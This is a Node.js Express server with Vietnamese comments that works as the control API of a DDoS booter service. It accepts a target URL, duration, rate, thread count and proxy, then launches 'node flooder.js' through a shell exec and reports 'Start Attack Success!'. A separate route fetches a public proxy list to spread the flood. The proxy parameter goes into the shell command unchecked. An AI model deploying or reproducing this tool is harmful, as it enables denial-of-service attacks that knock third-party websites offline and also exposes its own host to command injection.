const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');

const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;
const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@'];

const api_port = 4000; // Cổng API
const api_key = "quangdev"; // Khóa API của bạn

const app = express();
app.use(express.json());

app.get(`/api`, async (req, res) => {
    const field = {
        url: req.query.url || undefined,
        time: req.query.time || undefined,
        rate: req.query.rate || undefined,
        thea: req.query.thea || undefined,
        proxy: req.query.proxy || undefined,
        api_key: req.query.api_key || undefined,
    };

    // Kiểm tra API key
    if (field.api_key !== api_key) return res.json({ status: 500, data: `Khóa API không hợp lệ` });

    // Kiểm tra các trường đầu vào
    const containsBlacklisted = blackList.some(char => field.url.includes(char));
    if (!field.url || !urlRegex.test(field.url) || containsBlacklisted) return res.json({ status: 500, data: `URL không hợp lệ` });
    if (!field.time || isNaN(field.time) || field.time > 86400) return res.json({ status: 500, data: `Thời gian cần phải là một số trong khoảng 0-86400` });
    if (!field.rate || isNaN(field.rate)) return res.json({ status: 500, data: `Rate không hợp lệ` });
    if (!field.thea || isNaN(field.thea)) return res.json({ status: 500, data: `Thea không hợp lệ` });
    if (!field.proxy) return res.json({ status: 500, data: `Proxy không được để trống` });

    // Ghi log URL, thời gian, rate và threading
    console.log(`Url: ${field.url} Time: ${field.time} Rate: ${field.rate} Threading: ${field.thea} đang thực hiện Start Attack`);

    // Chuẩn bị lệnh gọi tệp flooder.js
    const command = `node flooder.js ${field.url} ${field.time} ${field.rate} ${field.thea} ${field.proxy}`;

    // Gửi phản hồi trạng thái ban đầu ngay lập tức
    res.json({
        status: 200,
        message: 'Start Attack Success!',
        data: {
            url: field.url,
            time: field.time,
            rate: field.rate,
            thea: field.thea,
            proxy: field.proxy,
        }
    });

    // Thực thi lệnh sau khi gửi phản hồi
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Lỗi: ${stderr}`);
            return;
        }

        console.log(`Gửi yêu cầu thành công: ${stdout}`);
    });
});

// Thêm route tải proxy tự động
app.get('/proxy', async (req, res) => {
    const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
    try {
        const response = await axios.get(proxyUrl);
        fs.writeFileSync('proxies.txt', response.data);
        console.log(`Đã tải và lưu proxy vào tệp proxies.txt`);
        return res.json({ status: 200, message: "Đã tải proxy thành công" });
    } catch (error) {
        console.error(`Lỗi khi tải proxy: ${error.message}`);
        return res.json({ status: 500, message: "Lỗi khi tải proxy" });
    }
});

app.listen(api_port, () => console.log(`API đã chạy trên cổng ${api_port}`));
